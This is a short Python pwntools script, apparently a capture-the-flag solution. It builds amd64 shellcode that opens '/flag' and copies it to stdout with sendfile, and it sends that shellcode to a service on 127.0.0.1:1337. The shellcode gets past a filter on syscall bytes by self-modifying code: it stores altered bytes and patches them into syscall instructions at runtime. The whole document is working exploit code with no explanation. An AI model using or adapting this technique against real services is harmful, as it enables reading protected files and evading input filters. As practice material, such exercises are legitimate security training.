from pwn import *

context.arch = "amd64"
#context.log_level = debug
context.encoding = "latin"

def print_clean(data):
    data = data.split(b"\n")
    for i in data:
        print(i.decode("latin-1"))

# shellcode goes here
shellcode = asm("""
/*open*/
xor rdi, rdi
xor rsi, rsi
xor rdx, rdx
lea rdi, [rip+flag]
mov rax, 2
add byte ptr [rip+bad_byte+1], 2
add byte ptr [rip+bad_byte], 2
bad_byte:
.byte 0x0d 
.byte 0x03

mov rsi, rax
mov rdi, 1
mov r10, 100
mov rax, SYS_sendfile
add byte ptr [rip+bad_byte_2+1], 2
add byte ptr [rip+bad_byte_2], 2
bad_byte_2:
.byte 0x0d
.byte 0x03

flag:
    .ascii "/flag"
""")
print(disasm(shellcode))
p = remote("127.0.0.1", 1337)
p.sendafter(b"Reading 0x1000 bytes from stdin.\n", shellcode)
p.interactive()
